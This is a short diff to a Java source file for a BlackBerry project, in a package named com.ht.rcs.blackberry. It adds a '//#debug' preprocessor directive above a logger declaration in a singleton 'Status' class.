@@ -29,6 +29,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public final class Status implements Singleton {
 
     /** The debug instance. */
+	//#debug
     private static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
 
     /** The agents. */
